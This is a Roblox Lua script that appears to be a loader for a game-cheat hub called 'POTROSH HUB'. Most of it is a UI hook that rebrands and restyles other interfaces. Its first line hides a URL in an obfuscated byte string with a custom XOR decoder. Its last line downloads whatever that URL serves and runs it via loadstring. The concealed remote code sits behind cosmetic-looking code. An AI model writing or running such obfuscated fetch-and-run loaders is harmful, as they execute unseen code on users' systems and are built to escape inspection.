
--[[ STAGE 2: VISUAL CORE ]]
local l0BDOi7KXtNz="\194\167\168\173\171\117\129\130\176\194\173\135\191\206\180\209\181\201\183\186\201\189\205\210\212\191\207\215\194\153\213\218\221\156\222\222\224\222\227\220\229\226\230\210\226\168\230\215\241\232\241\214\237\243\244\178\245\242\251\247\183\029\227\255\229\231\233\232\015\012\008\252\004\002\006\012\255\006\010\246\027\024\017\020\018\019\033\051\019\048\048\038\035\024\003\007\023\022\045\024\026\206\205\216\032\219\220\231\042\018\039"local iVswtQJsqkLopoB8=183 local emMcgMsK1RFT_nR=204 local W1nTnFWwCmL9eXu9qB=0 local jhIPm3GKT4p8dcnVIe=1 local GXfhfIZ5Ep2lP=22 local MldwFv9P8Pn9_=false local JJ38xI5XXFmByY=bit32 and bit32.bxor if not JJ38xI5XXFmByY then JJ38xI5XXFmByY=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local w7e64yBfAUODLaxXgJ={}for jjofc2BtDCLGEm6IrsXC=1,#l0BDOi7KXtNz do local ZEptmP5SuyE44=string.byte(l0BDOi7KXtNz,jjofc2BtDCLGEm6IrsXC)local YSPizKv5n1QTbBlB=(emMcgMsK1RFT_nR+(jjofc2BtDCLGEm6IrsXC*jhIPm3GKT4p8dcnVIe)+GXfhfIZ5Ep2lP)%256 if W1nTnFWwCmL9eXu9qB==0 then ZEptmP5SuyE44=(ZEptmP5SuyE44-YSPizKv5n1QTbBlB)%256 w7e64yBfAUODLaxXgJ[jjofc2BtDCLGEm6IrsXC]=string.char(JJ38xI5XXFmByY(ZEptmP5SuyE44,iVswtQJsqkLopoB8))else ZEptmP5SuyE44=JJ38xI5XXFmByY(ZEptmP5SuyE44,iVswtQJsqkLopoB8)w7e64yBfAUODLaxXgJ[jjofc2BtDCLGEm6IrsXC]=string.char((ZEptmP5SuyE44-YSPizKv5n1QTbBlB)%256)end end local xBCPhu1Am7QvtRDp=table.concat(w7e64yBfAUODLaxXgJ)if MldwFv9P8Pn9_ then xBCPhu1Am7QvtRDp=string.reverse(xBCPhu1Am7QvtRDp)end local fBdbcEtCiqqQsFW5Q8l=xBCPhu1Am7QvtRDp
local HubName = "POTROSH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(fBdbcEtCiqqQsFW5Q8l))()
